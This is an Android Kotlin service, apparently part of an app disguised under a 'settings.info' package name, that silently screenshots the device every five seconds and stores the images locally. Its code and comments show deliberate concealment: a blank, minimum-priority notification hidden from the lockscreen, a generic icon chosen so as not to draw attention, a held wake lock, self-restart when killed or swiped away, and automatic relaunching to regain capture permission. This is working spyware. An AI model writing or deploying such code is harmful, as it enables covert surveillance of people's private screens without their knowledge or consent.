package com.settings.info

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

class ScreenshotService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private val wakeLock: PowerManager.WakeLock by lazy {
        (getSystemService(POWER_SERVICE) as PowerManager).run {
            newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenshotService::WakeLock").apply {
                setReferenceCounted(false)
            }
        }
    }
    
    private val TAG = "ScreenshotService"
    
    // For better tracking
    private var screenshotCount = 0
    private var screenshotInterval = 5000L // 5 seconds between screenshots
    private var isRunning = AtomicBoolean(false)
    private var width = 0
    private var height = 0
    private var density = 0

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "ScreenshotService onCreate called")
        try {
            // Create an invisible notification for foreground service requirement
            startForeground(1, createSilentNotification())
            
            // Get screen metrics
            val metrics = DisplayMetrics()
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val defaultDisplay = windowManager.defaultDisplay
            defaultDisplay.getRealMetrics(metrics)
            width = metrics.widthPixels
            height = metrics.heightPixels
            density = metrics.densityDpi
            
            // Acquire wake lock to keep service running
            acquireWakeLock()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand called with startId: $startId")
        
        try {
            // If we're already running, just return
            if (isRunning.get()) {
                Log.d(TAG, "Service already running, ignoring duplicate start")
                return START_STICKY
            }
            
            // Read media projection data
            val resultCode = intent?.getIntExtra("resultCode", Activity.RESULT_CANCELED) ?: Activity.RESULT_CANCELED
            val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent?.getParcelableExtra("data", Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent?.getParcelableExtra("data")
            }
            
            if (resultCode != Activity.RESULT_OK || data == null) {
                Log.e(TAG, "Invalid result code or data: $resultCode")
                
                // Try to auto-start MainActivity to get projection permission
                handler.postDelayed({
                    try {
                        val mainIntent = Intent(this, MainActivity::class.java)
                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(mainIntent)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error starting MainActivity for projection", e)
                    }
                }, 1000)
                
                return START_STICKY
            }
            
            // Get the media projection
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to get media projection")
                return START_STICKY
            }
            
            // Create virtual display
            setupVirtualDisplay()
            
            // Mark as running
            isRunning.set(true)
            
            // Start the regular schedule
            startTakingScreenshots()
            
            Log.d(TAG, "Screenshot service fully initialized and started")
            return START_STICKY // Sticky means service will be restarted if killed
        } catch (e: Exception) {
            Log.e(TAG, "Error in onStartCommand", e)
            return START_STICKY
        }
    }
    
    private fun acquireWakeLock() {
        try {
            if (!wakeLock.isHeld) {
                wakeLock.acquire(10*60*1000L /*10 minutes*/)
                Log.d(TAG, "Wake lock acquired")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error acquiring wake lock", e)
        }
    }
    
    private fun releaseWakeLock() {
        try {
            if (wakeLock.isHeld) {
                wakeLock.release()
                Log.d(TAG, "Wake lock released")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing wake lock", e)
        }
    }
    
    private fun setupVirtualDisplay() {
        try {
            // Create image reader
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            
            // Create virtual display
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )
            
            Log.d(TAG, "Virtual display setup: $width x $height @ $density")
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up virtual display", e)
        }
    }

    private fun startTakingScreenshots() {
        Log.d(TAG, "Starting screenshot schedule (every $screenshotInterval ms)")
        
        // Take first screenshot immediately
        takeScreenshot()
        
        // Create a self-rescheduling runnable that will continue even if some attempts fail
        val screenshotRunnable = object : Runnable {
            override fun run() {
                if (!isRunning.get()) {
                    Log.d(TAG, "Service no longer running, stopping screenshot capture")
                    return
                }
                
                try {
                    // Make sure we have a wake lock
                    acquireWakeLock()
                    
                    // Take screenshot
                    takeScreenshot()
                    
                    // Schedule next capture
                    handler.postDelayed(this, screenshotInterval)
                } catch (e: Exception) {
                    Log.e(TAG, "Error in screenshot scheduler", e)
                    // Still try to continue
                    handler.postDelayed(this, screenshotInterval)
                }
            }
        }
        
        // Start the cycle (delayed by interval)
        handler.postDelayed(screenshotRunnable, screenshotInterval)
    }

    private fun takeScreenshot() {
        try {
            // Get the latest image
            val image = imageReader?.acquireLatestImage()
            if (image == null) {
                Log.e(TAG, "Failed to acquire image - null image")
                return
            }
            
            // Process the image into bitmap
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width
            
            // Create bitmap
            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()
            
            screenshotCount++
            Log.d(TAG, "Screenshot #$screenshotCount taken")
            
            // Save bitmap locally
            saveBitmap(bitmap)
        } catch (e: Exception) {
            Log.e(TAG, "Error taking screenshot", e)
        }
    }

    private fun saveBitmap(bitmap: Bitmap) {
        try {
            // Get screenshot storage directory
            val screenshotDir = StorageManager.getScreenshotsDirectory(applicationContext)
            if (!screenshotDir.exists()) {
                screenshotDir.mkdirs()
            }
            
            // Create a unique filename with timestamp
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val deviceId = Build.MANUFACTURER + "_" + Build.MODEL.replace(" ", "_")
            val file = File(screenshotDir, "${deviceId}_${timestamp}.jpg")
            
            // Save the file
            val fos = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos)
            fos.flush()
            fos.close()
            
            Log.d(TAG, "Saved screenshot to ${file.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "Error saving bitmap locally", e)
        }
    }

    // Create a notification that is completely silent and invisible
    private fun createSilentNotification(): Notification {
        val channelId = "screenshot_service"
        val notificationManager = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Create a silent notification channel
            val channel = NotificationChannel(
                channelId, 
                "Background Service", 
                NotificationManager.IMPORTANCE_MIN // Minimum importance = no sound, no visual interruption
            ).apply {
                setSound(null, null) // No sound
                enableLights(false) // No lights
                enableVibration(false) // No vibration
                setShowBadge(false) // No badge
            }
            notificationManager.createNotificationChannel(channel)
        }

        // Create a completely silent notification
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("") // Empty title
            .setContentText("") // Empty text
            .setSmallIcon(android.R.drawable.ic_menu_gallery) // Generic icon that won't draw attention
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority
            .setOngoing(true)
            .setSilent(true) // Silent notification
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Secret from lockscreen
            .build()
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        
        // Restart ourselves if needed
        val restartServiceIntent = Intent(applicationContext, ScreenshotService::class.java)
        val restartServicePendingIntent = PendingIntent.getService(
            this, 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        alarmManager.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent)
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            isRunning.set(false)
            handler.removeCallbacksAndMessages(null)
            
            // Clean up resources
            virtualDisplay?.release()
            mediaProjection?.stop()
            
            releaseWakeLock()
            
            // Try to restart ourself
            val restartServiceIntent = Intent(applicationContext, ScreenshotService::class.java)
            restartServiceIntent.setPackage(packageName)
            startService(restartServiceIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Error in onDestroy", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
